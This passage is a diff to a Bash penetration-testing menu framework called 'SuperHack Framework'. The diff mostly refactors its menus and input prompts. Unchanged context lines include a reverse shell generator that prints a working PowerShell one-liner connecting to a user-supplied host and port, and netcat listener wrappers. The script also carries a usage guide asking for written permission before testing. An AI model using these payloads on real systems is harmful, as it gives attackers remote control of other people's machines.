-EOF
-        echo -e "${NC}"
+        show_menu "Information & Help" "1) Framework Information
+2) Tool Descriptions
+3) Usage Guidelines
+4) Legal Disclaimer
+5) System Information
+6) View Logs
+0) Back to Main Menu"
         
-        echo "1) Framework Information"
-        echo "2) Tool Descriptions"
-        echo "3) Usage Guidelines"
-        echo "4) Legal Disclaimer"
-        echo "5) System Information"
-        echo "6) View Logs"
-        echo "0) Back to Main Menu"
-        echo ""
-        echo -n "Select option: "
-        read info_choice
+        local info_choice=$(read_input "Select option: " 1 2 "Info Menu")
         
         case $info_choice in
             1) framework_info ;;
@@ -3343,6 +3786,8 @@ EOF
 }
 
 framework_info() {
+    show_menu "Framework Information" "System and tool information"
+    
     echo -e "${BLUE}[*] Framework Information${NC}"
     echo ""
     echo "SuperHack Framework v$VERSION"
@@ -3369,6 +3814,8 @@ framework_info() {
 }
 
 tool_descriptions() {
+    show_menu "Tool Descriptions" "Available security tools"
+    
     echo -e "${BLUE}[*] Tool Descriptions${NC}"
     echo ""
     echo "=== Network Scanning ==="
@@ -3407,6 +3854,8 @@ tool_descriptions() {
 }
 
 usage_guidelines() {
+    show_menu "Usage Guidelines" "Best practices and workflow"
+    
     echo -e "${BLUE}[*] Usage Guidelines${NC}"
     echo ""
     echo "1. ALWAYS obtain written permission before testing"
@@ -3430,6 +3879,7 @@ usage_guidelines() {
 }
 
 legal_disclaimer() {
+    show_banner
     echo -e "${RED}"
     cat << "EOF"
     ╔═══════════════════════════════════════════════════════════╗
@@ -3464,14 +3914,14 @@ EOF
 # Network listener/ncat wrapper
 network_listener() {
     check_install netcat-traditional nc
-    echo -e "${BLUE}[*] Network Listener${NC}"
     
-    echo -n "Enter port to listen on: "
-    read listen_port
+    show_menu "Network Listener" "Listen for incoming connections"
+    
+    local listen_port=$(read_input "Enter port to listen on: " 1 2 "Net Listener")
     [[ -z "$listen_port" ]] && return
+    [[ "$listen_port" == "99" ]] && return
     
-    echo -n "Save output to file? (y/n): "
-    read save_output
+    local save_output=$(read_input "Save output to file? (y/n): " 2 2 "Net Listener")
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     
@@ -3479,8 +3929,7 @@ network_listener() {
     echo -e "${RED}[!] Run this in another terminal if you need to continue using this menu:${NC}"
     echo -e "${CYAN}nc -lvp $listen_port${NC}"
     echo ""
-    echo -n "Start listener now? (y/n): "
-    read start_now
+    local start_now=$(read_input "Start listener now? (y/n): " 3 3 "Net Listener")
     
     if [[ "$start_now" == "y" ]]; then
         if [[ "$save_output" == "y" ]]; then
@@ -3500,14 +3949,14 @@ network_listener() {
 
 # Quick reverse shell generator
 quick_reverse_shell() {
-    echo -e "${BLUE}[*] Quick Reverse Shell Generator${NC}"
+    show_menu "Quick Reverse Shell Generator" "Generate reverse shell commands"
     
-    echo -n "Enter your IP (LHOST): "
-    read lhost
+    local lhost=$(read_input "Enter your IP (LHOST): " 1 2 "Reverse Shell")
     [[ -z "$lhost" ]] && return
+    [[ "$lhost" == "99" ]] && return
     
-    echo -n "Enter port (LPORT): "
-    read lport
+    local lport=$(read_input "Enter port (LPORT): " 2 2 "Reverse Shell")
+    [[ "$lport" == "99" ]] && return
     
     echo ""
     echo -e "${CYAN}=== Bash ===${NC}"
@@ -3526,8 +3975,7 @@ quick_reverse_shell() {
     echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$lhost\",$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
     echo ""
     
-    echo -n "Start listener now? (y/n): "
-    read start_listener
+    local start_listener=$(read_input "Start listener now? (y/n): " 3 3 "Reverse Shell")
     if [[ "$start_listener" == "y" ]]; then
         echo -e "${YELLOW}[*] Starting listener...${NC}"
         echo -e "${RED}[!] This will block the terminal. Run in another terminal to continue:${NC}"
@@ -3544,6 +3992,8 @@ quick_reverse_shell() {
 
 # Log viewer
 view_logs() {
+    show_menu "Session Logs" "View framework activity logs"
+    
     echo -e "${BLUE}[*] Session Logs${NC}"
     
     if [[ ! -d "$LOG_DIR" ]] || [[ -z "$(ls -A "$LOG_DIR" 2>/dev/null)" ]]; then
@@ -3552,8 +4002,7 @@ view_logs() {
         echo "Available logs:"
         ls -la "$LOG_DIR"/*.log 2>/dev/null || echo "No .log files found"
         echo ""
-        echo -n "View log file (enter filename or 'all'): "
-        read log_file
+        local log_file=$(read_input "View log file (enter filename or 'all'): " 1 2 "View Logs")
         
         if [[ "$log_file" == "all" ]]; then
             for f in "$LOG_DIR"/*.log; do
@@ -3570,6 +4019,8 @@ view_logs() {
 
 # System information
 system_info() {
+    show_menu "System Information" "Display system configuration"
+    
     echo -e "${BLUE}[*] System Information${NC}"
     echo ""
     echo -e "${CYAN}=== OS Information ===${NC}"
@@ -3596,6 +4047,8 @@ system_info() {
 
 # Update framework
 update_framework() {
+    show_menu "Update Framework" "Update packages and dependencies"
+    
     echo -e "${BLUE}[*] Updating SuperHack Framework${NC}"
     
     echo -e "${YELLOW}[*] Updating package lists...${NC}"
@@ -3635,39 +4088,36 @@ main_menu() {
         echo ""
         echo -e "${YELLOW}  [0] Exit Framework${NC}"
         echo ""
-        echo -n "Select option: "
-        read menu_choice
+        local menu_choice=$(read_input "Select option: " 1 1 "Main Menu")
         
         case $menu_choice in
             1)
                 while true; do
-                    echo ""
-                    echo -e "${CYAN}=== NETWORK SCANNING ===${NC}"
-                    echo "1) Advanced Nmap Scanner"
-                    echo "2) Network Discovery (Ping Sweep)"
-                    echo "3) Quick Port Scanner"
-                    echo "0) Back to Main Menu"
-                    echo -n "Choice: "
-                    read scan_choice
+                    show_menu "Network Scanning" "1) Advanced Nmap Scanner
+2) Network Discovery (Ping Sweep)
+3) Quick Port Scanner
+4) Terminal Wireshark Capture
+0) Back to Main Menu"
+                    
+                    local scan_choice=$(read_input "Choice: " 1 2 "Network Scanning")
                     case $scan_choice in
                         1) advanced_nmap_scan ;;
                         2) network_discovery ;;
                         3) port_scanner ;;
+                        4) wireshark_terminal ;;
                         0) break ;;
                     esac
                 done
                 ;;
             2)
                 while true; do
-                    echo ""
-                    echo -e "${CYAN}=== ENUMERATION ===${NC}"
-                    echo "1) SMB Enumeration"
-                    echo "2) LDAP/AD Enumeration"
-                    echo "3) Web Enumeration"
-                    echo "4) Subdomain Enumeration"
-                    echo "0) Back to Main Menu"
-                    echo -n "Choice: "
-                    read enum_choice
+                    show_menu "Enumeration" "1) SMB Enumeration
+2) LDAP/AD Enumeration
+3) Web Enumeration
+4) Subdomain Enumeration
+0) Back to Main Menu"
+                    
+                    local enum_choice=$(read_input "Choice: " 1 2 "Enumeration")
                     case $enum_choice in
                         1) smb_enum ;;
                         2) ldap_enum ;;
@@ -3685,14 +4135,12 @@ main_menu() {
             8) wifi_attacks ;;
             9)
                 while true; do
-                    echo ""
-                    echo -e "${CYAN}=== UTILITIES ===${NC}"
-                    echo "1) Network Listener"
-                    echo "2) Quick Reverse Shell"
-                    echo "3) View Logs"
-                    echo "0) Back to Main Menu"
-                    echo -n "Choice: "
-                    read util_choice
+                    show_menu "Utilities" "1) Network Listener
+2) Quick Reverse Shell
+3) View Logs
+0) Back to Main Menu"
+                    
+                    local util_choice=$(read_input "Choice: " 1 2 "Utilities")
                     case $util_choice in
                         1) network_listener ;;
                         2) quick_reverse_shell ;;
@@ -3703,15 +4151,13 @@ main_menu() {
                 ;;
             10)
                 while true; do
-                    echo ""
-                    echo -e "${CYAN}=== SYSTEM ===${NC}"
-                    echo "1) System Information"
-                    echo "2) Update Framework"
-                    echo "3) Initialize Directories"
-                    echo "4) Package Manager"
-                    echo "0) Back to Main Menu"
-                    echo -n "Choice: "
-                    read sys_choice
+                    show_menu "System" "1) System Information
+2) Update Framework
+3) Initialize Directories
+4) Package Manager
+0) Back to Main Menu"
+                    
+                    local sys_choice=$(read_input "Choice: " 1 2 "System")
                     case $sys_choice in
                         1) system_info ;;
                         2) update_framework ;;
